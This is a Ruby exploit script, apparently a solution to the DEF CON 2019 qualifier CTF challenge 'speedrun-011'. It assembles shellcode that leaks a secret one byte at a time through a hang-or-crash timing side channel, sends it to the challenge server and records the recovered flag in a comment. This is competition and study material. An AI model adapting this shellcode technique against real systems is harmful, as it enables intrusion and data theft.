#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = 'speedrun-011.quals2019.oooverflow.io', 31337
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = ''
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

i = ARGV[0].to_i
c = ARGV[1].to_i
payload = asm(shellcraft.mov('rbp', i) + <<-EOS + shellcraft.syscall('SYS_open'))
add rdi, rbp
xor rax, rax
mov al, byte ptr [rdi]
sub rax, #{c}
test rax, rax
je ok
jmp dead
ok:
jmp ok
dead:
EOS

fail if payload.bytes.include? 0
z.write(payload.ljust(0x200, "\x90"))

z.gets 'vehicle'
z.gets
begin
z.gets
rescue Pwnlib::Errors::EndOfTubeError
end
# OOO{Why___does_th0r__need_a_car?}
